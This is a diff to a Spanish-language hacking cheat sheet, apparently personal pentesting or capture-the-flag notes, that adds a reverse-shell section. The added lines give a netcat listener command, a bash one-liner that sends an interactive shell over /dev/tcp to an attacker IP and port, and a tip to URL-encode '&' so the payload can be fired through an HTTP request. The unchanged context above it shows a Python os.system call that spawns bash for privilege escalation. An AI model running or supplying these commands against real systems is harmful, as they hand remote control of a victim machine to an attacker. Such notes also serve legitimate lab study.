@@ -82,3 +82,25 @@ Ejecuta una shell Bash desde un script Python, útil para escalar privilegios si
 import os;
 os.system("/bin/bash")
 ```
+
+### 📡 Reverse Shell + Canal de Escucha
+Permite tomar control remoto de una máquina: se abre un listener (atacante) y se conecta desde la víctima.
+
+Abre un puerto (3344) a la espera de conexiones.
+```
+nc -lvnp 3344
+
+-l: escucha.
+
+-v: salida detallada.
+
+-n: no resuelve DNS.
+
+-p 3344: puerto a escuchar.
+```
+
+Ejecuta una shell interactiva que redirige entrada/salida hacia la IP del atacante (172.17.0.1) y puerto (3344).
+```
+bash -c "bash -i >& /dev/tcp/172.17.0.1/3344 0>&1"
+```
+> 🧠 Nota: Si se lanza desde navegador o HTTP (por ejemplo en una URL), reemplaza & por %26 para evitar que se corte el comando.
